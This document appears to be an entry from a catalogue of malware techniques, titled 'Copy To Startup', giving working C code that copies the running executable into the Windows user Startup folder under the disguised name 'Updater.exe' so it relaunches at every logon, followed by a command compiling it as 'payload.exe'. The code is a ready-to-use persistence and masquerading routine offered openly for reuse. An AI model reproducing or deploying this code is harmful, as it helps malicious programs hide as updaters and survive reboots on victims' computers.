---
author(s):
  - Userware
  - Chad Aoudi
---
# Copy To Startup

## WinAPI

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winbase.h>

#pragma comment(lib, "kernel32.lib")

void Persistence(const char *executable_path, const char *masquerade_payload) {
    char *appdata = getenv("APPDATA");
    const char *startup_path = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
    char destination[MAX_PATH];

    if (snprintf(destination, sizeof(destination), "%s%s%s", appdata, startup_path, masquerade_payload) >= sizeof(destination)) {
        fprintf(stderr, "Destination path is too long.\n");
        return;
    }

    // Attempt to copy the file
    #ifdef _WIN64
    // For 64-bit architecture
    wchar_t wDestination[MAX_PATH];
    wchar_t wExePath[MAX_PATH];

    // Convert the executable and destination path to wide string
    MultiByteToWideChar(CP_UTF8, 0, executable_path, -1, wExePath, MAX_PATH);
    MultiByteToWideChar(CP_UTF8, 0, destination, -1, wDestination, MAX_PATH);

    if (!CopyFileW(wExePath, wDestination, FALSE)) {
        fprintf(stderr, "Error copying file: %lu\n", GetLastError());
        return;
    }
    #else
    // For 32-bit architecture
    if (!CopyFileA(executable_path, destination, FALSE)) {
        fprintf(stderr, "Error copying file: %lu\n", GetLastError());
        return;
    }
    #endif

    printf("File copied successfully to the Startup directory.\n");
}

int main(int argc, char *argv[]) {
    Persistence(argv[0], "Updater.exe");

    return 0;
}
```

Compile the payload.

```
$ x86_64-w64-mingw32-gcc -l kernel32 -o payload.exe payload.c
```